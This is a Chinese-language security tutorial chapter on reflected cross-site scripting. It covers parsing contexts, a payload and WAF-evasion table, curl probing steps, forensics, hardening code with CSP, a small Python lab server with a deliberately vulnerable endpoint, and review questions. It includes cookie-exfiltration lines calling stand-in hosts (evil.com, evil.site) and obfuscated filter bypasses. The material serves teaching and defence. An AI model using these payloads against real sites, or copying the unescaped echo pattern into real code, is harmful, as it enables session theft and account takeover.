# R14.1 反射型跨站腳本攻擊機制與防禦分析 (Reflected Cross-Site Scripting)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

在現代網頁應用程式中，伺服器端經常需要動態讀取使用者透過 HTTP GET/POST 提交的查詢參數、錯誤訊息或表單資料，並立即將其回顯（Reflect）在回傳的 HTML 回應內容中（例如搜尋結果頁面顯示「您搜尋的關鍵字是：xxx」）。**反射型跨站腳本 (Reflected Cross-Site Scripting, RXSS)** 弱點發生的本質在於：**「伺服器端在將不可信的輸入串流拼裝至 HTML 檔案時，未進行上下文感知的輸出編碼 (Context-Aware Output Encoding)；同時瀏覽器將該不可信字串誤判為可執行的程式碼指令 (Code Injection in Browser Runtime)」**。

與儲存型 XSS (R14.2) 將載荷永久寫入資料庫不同，反射型 XSS 具備**「單次即時性（Non-Persistent / In-Band）」**的特性——惡意載荷隨請求發送，隨回應立即反射並於被害者瀏覽器環境中執行。攻擊者通常透過社交工程（電子郵件釣魚、惡意連結轉發）誘導具備存取權限的目標受害者點擊特製 URL。一旦腳本在受害者的瀏覽器工作階段中執行，攻擊者即可突破**同源政策 (Same-Origin Policy, SOP)** 邊界，**竊取敏感 Session Cookie / LocalStorage Token**、**以受害者身分靜默發起跨站請求 (CSRF 放大)**、或是**動態覆寫 DOM 竊取密碼輸入**。

```
[攻擊者] ── 1. 構造特製惡意 URL (帶有 XSS 載荷) ──► [發布至釣魚郵件 / 論壇誘使點擊]
                                                                  │
                                                                  ▼
                                                      [受害者瀏覽器環境 (User)]
                                                                  │
                                ┌─────────────────────────────────┴─────────────────────────────────┐
                                │ 2. 點擊連結向受害應用伺服器發送 GET /search?q=<script>...         │
                                ▼                                                                   ▼
                [後端 Web 應用伺服器 (Server)]                                         [攻擊者受控伺服器 (C2)]
                                │                                                                   ▲
                                ├─► (脆弱點：未經 HTML 跳脫，直接將 q 拼裝至 HTML 原始碼)            │
                                ▼                                                                   │
                [回傳 HTTP 200 回應 (包含未跳脫腳本)]                                                │
                                │                                                                   │
                                ▼                                                                   │
                [受害者瀏覽器開始進行 HTML 語法分析]                                                │
                                │                                                                   │
                                ├─► [詞法分析器進入 SCRIPT 狀態機 ➔ 解析並執行惡意 JavaScript]       │
                                ▼                                                                   │
                [以受害者登入憑證背景讀取 document.cookie / JWT]                                     │
                                │                                                                   │
                                └─ 3. 偷渡傳輸：透過 fetch('http://evil.com/leak?c=' + cookie) ────┘
```

### 作戰痛點與決策分支
- **痛點場景**：目標系統端點具備現代 WAF 防護，簡單的 `<script>alert(1)</script>` 會被立即阻斷（HTTP 403）；或回顯點位於屬性標籤內部（如 `<input value="...">`），常規標籤無法閉合。
- **決策心流**：
  1. **反射點上下文識別 (Contextual Sink Identification)**：
     - 精確判斷輸入被注入至何種語法狀態機：**HTML 本體文字 (HTML Body)**、**標籤屬性 (Attribute Value)**、**JavaScript 區塊 (Script Block)**、**URL 屬性 (href/src)**、抑或 **CSS 樣式區塊**。
  2. **語法閉合與引數逃逸 (Context Breakout)**：
     - 若在屬性內：嘗試以雙引號 `"` 或單引號 `'` 閉合屬性，並追加事件處理器（如 `onfocus=... autofocus`）。
     - 若在 `<script>` 區塊內：評估是否能直接以 `</script>` 強制終止當前標籤，或利用單引號逃逸字串字面量進行語法串聯（如 `';alert(1)//`）。
  3. **技術邊界鑑別 (Boundary Seams)**：
     - **非 DOM XSS (R14.3)**：RXSS 的反射字串**完全來自伺服器回傳的原始 HTTP Response Body**；若伺服器回傳為純靜態頁面，是前端 JS 讀取 `location.search` 寫入 `innerHTML`，則屬於 DOM XSS。

## 🔬 第一動：底層協定/DOM 編譯全景解剖 (Vulnerability Mechanics & Contextual Lexing)

### 1. 瀏覽器 HTML 解析器五大狀態機與編碼語意歧異
依據 W3C HTML5 規範，瀏覽器在解析二進位串流為 DOM Tree 時，包含一個複雜的**詞法狀態機 (Tokenizer State Machine)**。同一串跳脫字元在不同上下文中的解析行為完全不同：

```
+---------------------------------------------------------------------------------------------------+
| 瀏覽器五大語法上下文解析特徵矩陣 (Browser Lexing Contexts)                                        |
|                                                                                                   |
| 上下文類型 (Context)      | 脆弱渲染場景範例                   | 正確防禦跳脫規範 (Encoding Standard) |
| :------------------------ | :--------------------------------- | :------------------------------------ |
| **1. HTML 文字本體**      | `<div>您搜尋的是: {INPUT}</div>`    | HTML Entity 編碼:                     |
|                           |                                    | `&`➔`&amp;`, `<`➔`&lt;`, `>`➔`&gt;    |
| **2. HTML 標籤屬性**      | `<input name="q" value="{INPUT}">` | HTML Attribute 編碼:                  |
|                           |                                    | 額外強制編碼 `"`➔`&quot;`, `'`➔`&#x27;`|
| **3. JavaScript 腳本區塊**| `<script>let q = '{INPUT}';</script>`| **HTML 編碼完全無效！**               |
|                           |                                    | 必須採用 JavaScript Unicode 跳脫:     |
|                           |                                    | `'`➔`\x27`, `"`➔`\x22`, `\n`➔`\x0A`   |
| **4. URL / 資源屬性**     | `<a href="{INPUT}">點擊</a>`       | **嚴禁接受 javascript: 偽協定！**      |
|                           |                                    | URL Percent 編碼 + 協定白名單校驗     |
| **5. CSS 樣式區塊**       | `<style>div { color: {INPUT}; }</style>`| CSS 特殊字元十六進位跳脫              |
+---------------------------------------------------------------------------------------------------+
```

#### 致命常識盲區：為何在 `<script>` 區塊內使用 `htmlspecialchars()` 依然會被秒殺？
許多開發者誤以為全域套用 `htmlspecialchars()` 就萬無一失：
```html
<script>
    // 伺服器端將 $_GET['user'] 經過 htmlspecialchars() 處理後注入:
    let currentUser = '<?= htmlspecialchars($_GET['user']); ?>';
</script>
```
- **底層原因**：`htmlspecialchars()` 預設**僅轉義 `&`、`"`、`<`、`>`**（在未明確設定 `ENT_QUOTES` 時甚至不轉義單引號 `'`）。
- 攻擊者傳入載荷：`';alert(document.domain);//`
- 產生的原始碼：`let currentUser = '';alert(document.domain);//';`
- 由於不包含 `<` 或 `>`，`htmlspecialchars()` 完全放行！單引號成功閉合 JavaScript 字串，後續指令直接進入 JS 引擎執行。

### 2. 同源政策 (SOP) 與 Cookie 攻擊面物理結構
XSS 之所以具備毀滅性，關鍵在於腳本執行時所繼承的**「執行環境環境特權 (Ambient Authority)」**：

```
+---------------------------------------------------------------------------------------------------+
| 跨站腳本特權突破物理圖譜                                                                          |
|                                                                                                   |
| 1. DOM 與儲存空間直讀 (In-Memory Access):                                                          |
|    - document.cookie: 直接讀取未標記 HttpOnly 的 Session ID、CSRF Token。                         |
|    - window.localStorage / sessionStorage: 讀取 Single Page App (SPA) 常見的 JWT Bearer Token。    |
|                                                                                                   |
| 2. 同源 API 任意代用 (Origin-Level Identity Impersonation):                                       |
|    - 攻擊者透過 fetch('/api/user/change_email', {method: 'POST', body: ...})                      |
|    - 瀏覽器自動附加該 Origin 的所有認證 Cookie 與 CORS 標頭，伺服器判定為受害者本人之合法操作！   |
|                                                                                                   |
| 3. DOM 介面惡意重繪 (Defacement / UI Redressing):                                                 |
|    - document.body.innerHTML = '...偽造的登入彈窗...';                                            |
|    - 攔截使用者的鍵盤輸入 (Keylogger)，直接側錄雙身分驗證碼 (MFA OTP)。                           |
+---------------------------------------------------------------------------------------------------+
```

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Vulnerability Analysis & Vectors)

### 1. 核心向量與技術變體速查表

| 機制變體 | 關鍵輸入載荷構造 (Payload Construction) | 突防原理與作用標記 |
| :--- | :--- | :--- |
| **HTML 文字區塊標準注入** | `<script>alert(document.domain)</script>`<br>`<img src=x onerror=alert(1)>` | 最基礎形態。當輸入未跳脫 `<` 與 `>` 時，瀏覽器詞法器直接生成新 HTML 標籤。 |
| **屬性閉合與事件觸發** | `"><script>alert(1)</script>`<br>`" onfocus="alert(1)" autofocus="` | 閉合前置標籤屬性雙引號，或注入無需點擊自動觸發的事件處理器 (`autofocus`)。 |
| **JavaScript 字串字面量逃逸** | `'-alert(1)-'`<br>`';alert(1)//`<br>`</script><script>alert(1)</script>` | 閉合 JS 單引號字串；或直接使用 `</script>` 提前終止當前腳本標籤（HTML 解析器優先於 JS 解析器）。 |
| **URL 偽協定執行 (href 注入)** | `javascript:alert(document.domain)`<br>`javascript:fetch('//evil.site/'+document.cookie)` | 當輸入被渲染至 `<a href="{INPUT}">` 時，點擊連結直接以當前 Origin 權限執行代碼。 |
| **Markdown / 富文本隱蔽注入** | `[點擊此處](javascript:alert(1))` | 利用 Markdown 解析器轉換為 HTML `<a>` 標籤的過程，偷渡 JavaScript 協定。 |
| **現代無空格標籤繞過** | `<svg/onload=alert(1)>`<br>`<details/open/ontoggle=alert(1)>` | 使用斜線 `/` 取代空白符號，繞過僅比對 `<svg ` 空白間距的初階 WAF 正則。 |

### 2. 精確差分探測流程 (CLI / cURL 驗證法)

在評估反射型 XSS 時，**絕不可隨意在生產環境彈窗**。合規的作戰方式為「無害標記 (Inert Canary) ➔ 語法邊界閉合 ➔ 差分檢驗」三步驟：

#### 步驟 1：發送無害 Canary 標記確定反射位置與上下文
```bash
curl -s "https://target-app.internal/search?q=CanaryProbeA1" | grep -n "CanaryProbeA1"
# 觀察回顯行：確認是落在 <div>{Canary}</div> 還是 <input value="{Canary}">
```

#### 步驟 2：測試特殊字元過濾狀態 (Character Filtering Fingerprint)
```bash
# 測試關鍵敏感字元: < > " ' ` / ( ) ;
curl -s --get --data-urlencode 'q=Canary<>"`();/' "https://target-app.internal/search" | grep -n "Canary"
```
**判定依據**：
- 若輸出顯示 `Canary&lt;&gt;&quot;`：表示伺服器實施了全量 HTML Entity 編碼，HTML 文字上下文安全。
- 若輸出依然原樣包含 `Canary<>"`：表示伺服器**完全未加防護**，存在高危險反射注入點！

#### 步驟 3：構造無害的 DOM 屬性變更驗證執行能力 (Non-Destructive Proof)
在受控演練中，**禁止讀取 Cookie 或跳出 alert**。最專業的 PoC 是變更頁面 Title 或修改 DOM 標記：
```html
<script>document.title='RXSS_CONFIRMED';document.documentElement.setAttribute('data-sec-test','VERIFIED');</script>
```

## 🥷 第三動：隱匿作戰與防禦規避技術 (Evasion & Anti-Forensics Analysis)

### 1. 規避 WAF 與過濾機制之技巧
- **標籤與事件處理器變形**：
  許多 WAF 正則僅監控 `onload`、`onerror`、`onclick` 等常見事件。利用 HTML5 冷門事件處理器達成規避：
  - `<marquee onstart=alert(1)>`
  - `<video><source onerror=alert(1)>`
  - `<select autofocus onfocus=alert(1)>`
- **字串與函數動態呼叫混淆**：
  若 WAF 阻斷 `alert`、`eval`、`document.cookie` 等字眼：
  - 反引號模板字串取代括號：`alert\`1\``
  - 十六進位與 Unicode 編碼：`window['\x61\x6c\x65\x72\x74'](1)`
  - 動態組裝全域對象：`top[/al/.source+/ert/.source](1)`
- **雙重 URL 編碼 (Double Encoding)**：
  部分存在反向代理的架構中，代理層解碼一次放行，後端應用程式框架（或自訂過濾器）又進行了第二次解碼，可利用 `%253Cscript%253E` 達成語意穿透。

### 2. 鑑識視角下的日誌殘留與遙測特徵
1. **Web Access Log 中的 Query String 痕跡**：
   - 由於 RXSS 多發生於 GET 請求，Nginx/Apache 的 `access.log` 會完整保留包含 `<`、`>`、`%3Cscript%3E` 的 URL 記錄。
2. **CSP 違規回報日誌 (CSP Violation Reports)**：
   - 若網站配置了 `Content-Security-Policy-Report-Only` 或 `report-uri`，瀏覽器在阻斷行內腳本或未經授權網域的外連時，會主動向 SOC 發送 JSON 格式的違規報告（包含 `blocked-uri`、`violated-directive`）。
3. **EDR 終端偵測（瀏覽器進程異常衍生）**：
   - 若 XSS 進一步結合瀏覽器漏洞或下載惡意檔案，Sysmon Event ID 1 會捕捉到 `chrome.exe` 或 `msedge.exe` 異常啟動 `cmd.exe` 或 `powershell.exe`。

## 🛡️ 第五動：安全架構加固與修復基線 (Hardening & Remediation Baseline)

### 1. 脆弱代碼 vs. 工業級安全防護重構

#### ❌ 脆弱的實現方式 (動態字串直接拼接)
```php
<!-- 脆弱範例 1: HTML 本體未編碼 -->
<div>搜尋結果: <?= $_GET['keyword']; ?></div>

<!-- 脆弱範例 2: 屬性未用引號包裹且未適當跳脫 -->
<input type="text" name="user" value=<?= $_GET['user']; ?>>

<!-- 脆弱範例 3: 直接拼接至 JS 區塊中 -->
<script>
    let searchVal = "<?= $_GET['keyword']; ?>";
</script>
```

#### ✅ 工業級架構加固方案 (上下文感知編碼 + 嚴格 CSP)

##### 1. 伺服器端現代模板上下文編碼 (Context-Aware Auto-Escaping)
```php
<!-- 正確範例 1: HTML 本體實施完整 Entity 編碼 -->
<div>搜尋結果: <?= htmlspecialchars($_GET['keyword'], ENT_QUOTES | ENT_HTML5, 'UTF-8'); ?></div>

<!-- 正確範例 2: 屬性嚴格加雙引號 + Attribute 編碼 -->
<input type="text" name="user" value="<?= htmlspecialchars($_GET['user'], ENT_QUOTES | ENT_HTML5, 'UTF-8'); ?>">

<!-- 正確範例 3: 傳遞資料至 JS 區塊的唯一正確解法：使用 JSON 編碼，絕不直接拼接字串！ -->
<script>
    let searchVal = <?= json_encode((string)$_GET['keyword'], JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
</script>
```

##### 2. 深度縱深防禦：內容安全策略 (Content Security Policy - CSP)
即使程式碼存在編碼疏漏，強健的 CSP 能在瀏覽器執行層直接剝奪未經授權腳本的執行能力：

```http
# 工業級 CSP 標頭基線 (建議部署於 HTTP Response Header)
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m12345'; object-src 'none'; base-uri 'self';
```
- **核心防護作用**：
  - `script-src 'self' 'nonce-...'`：**完全禁止任何未帶有隨機一次性 Nonce 的行內 `<script>` 與內嵌事件執行**（如 `onerror=`、`javascript:` 偽協定全部被瀏覽器直接處死）。
  - `object-src 'none'`：禁止 Flash/Java Applet 等外掛載入。

##### 3. Cookie 安全標誌配置 (Mitigating Credential Theft)
```http
Set-Cookie: session_id=XYZ123; Path=/; Secure; HttpOnly; SameSite=Lax
```
- **`HttpOnly`**：禁止 JavaScript 透過 `document.cookie` 讀取該 Cookie，徹底封殺憑證偷渡路徑。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

本實驗展示一個極簡的受控沙盒服務，直觀驗證未經編碼之反射點在瀏覽器中的執行行為與安全加固對照。

### 1. 靶場核心代碼 (`rxss_lab.py`，極簡 20 行)
```python
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlsplit, parse_qs
import html

class LabHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlsplit(self.path).query)
        keyword = query.get("q", [""])[0]
        
        # 依據路徑切換脆弱與加固模式
        if self.path.startswith("/vulnerable"):
            rendered = keyword # 缺陷：直接回顯未經編碼之字串
        else:
            rendered = html.escape(keyword, quote=True) # 加固：HTML Entity 完整轉義
            
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(f'<!doctype html><h1>搜尋系統</h1><div>結果: {rendered}</div>'.encode())

ThreadingHTTPServer(("127.0.0.1", 8141), LabHandler).serve_forever()
```

### 2. 演練與驗證步驟 (CLI 與 瀏覽器差分實證)

#### 步驟 1：CLI 驗證脆弱端點之反射未編碼現象

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 為什麼單純對輸入字串做「輸入黑名單過濾（如過濾 `<script>` 關鍵字）」永遠無法根治反射型 XSS？**  
  *分析思路*：HTML 語法極為寬容，執行 JavaScript 的載體除了 `<script>` 標籤外，還包含數十種內嵌標籤事件（如 `<img src=x onerror=...>`、`<svg onload=...>`、`<body onload=...>`）以及 URL 屬性中的 `javascript:` 偽協定。此外，黑名單極易受到大小寫、換行、編碼變形（如大小寫混用、無空格斜線 `<svg/onload=...>`）繞過。唯一根本防禦必須在**輸出端 (Output Sink) 依據當前上下文實施嚴格的結構編碼**。

- [ ] **Q2. 簡述反射型 XSS (RXSS)、儲存型 XSS (SXSS) 與 DOM 型 XSS (DOM XSS) 在資料流 (Data Flow) 與持久化特性上的根本區別？**  
  *分析思路*：
  1. **反射型 (RXSS)**：資料流為「用戶端請求 ➔ 伺服器端讀取 ➔ 伺服器端拼裝至 HTTP 回應 ➔ 用戶端立即執行」，資料不落地於資料庫。
  2. **儲存型 (SXSS)**：資料流為「用戶端提交 ➔ 伺服器端持久化寫入資料庫/檔案 ➔ 其他使用者請求頁面時，伺服器從資料庫撈出拼裝至回應 ➔ 受害者執行」，危害具備全域持續性。
  3. **DOM 型 (DOM XSS)**：資料流「完全發生在前端瀏覽器記憶體中」（例如前端 JS 讀取 `location.search` 並透過 `element.innerHTML` 寫入），**整個過程伺服器端回應內容完全不包含惡意載荷**。

- [ ] **Q3. 為什麼當反射點位於 `<script> let x = '{USER_INPUT}'; </script>` 區塊內部時，套用 `htmlspecialchars()` 依然會被繞過？**  
  *分析思路*：`htmlspecialchars()` 預設主要處理 HTML 語法標籤（轉義 `&`、`<`、`>`、`"`），但 `<script>` 區塊內部已經處於 JavaScript 直譯器的語法環境中。在 JavaScript 字串環境下，攻擊者只需使用單引號 `'` 即可閉合變數字串（若伺服器未啟用 `ENT_QUOTES` 轉義單引號），並利用 `;` 或 `-` 連接任意 JS 函數調用，全程完全不依賴 `<` 或 `>` 符號，因此 HTML Entity 編碼在此處毫無防護效力。

- [ ] **Q4. 部署 `Content-Security-Policy (CSP)` 能否完全替代程式碼層級的輸出編碼 (Output Encoding)？為什麼？**  
  *分析思路*：不能。CSP 屬於**縱深防禦 (Defense-in-Depth)** 手段，而非漏洞根治方案。首先，若程式碼未作編碼，攻擊者依然能注入惡意 HTML 標籤（如注入 `<h1>` 竄改介面、或注入外部表單 `<form action=...>` 實施釣魚）；其次，現實中複雜業務的 CSP 政策往往因相容性而放寬（例如包含過寬的網域白名單、或不得不支援特定 JSONP 端點），攻擊者可藉此實施 CSP 繞過。必須堅持「輸出端嚴格編碼為主，CSP 限制執行權限為輔」的雙重防線。

- [ ] **Q5. 針對現代 Web 架構，防範反射型 XSS 最徹底、最具工程保障的黃金架構基線為何？**  
  *分析思路*：
  1. **前端現代框架自動跳脫**：全面採用 React、Vue 或 Angular 等自動將變數視為純文字文字節點 (Text Node) 渲染的框架，徹底廢棄直接操作 `innerHTML` 或 `document.write` 的原始操作。
  2. **後端模板上下文感知編碼**：後端若使用模板引擎，全面強制啟用上下文自動編碼機制；若需向前端傳遞變數，一律使用 `json_encode()` 格式化為純資料。
  3. **邊界與認證防禦基線**：核心認證憑證全面標記 `HttpOnly` 與 `SameSite=Lax/Strict`；在 HTTP 回應標頭強制實施以 Nonce 為核心的嚴格 CSP。
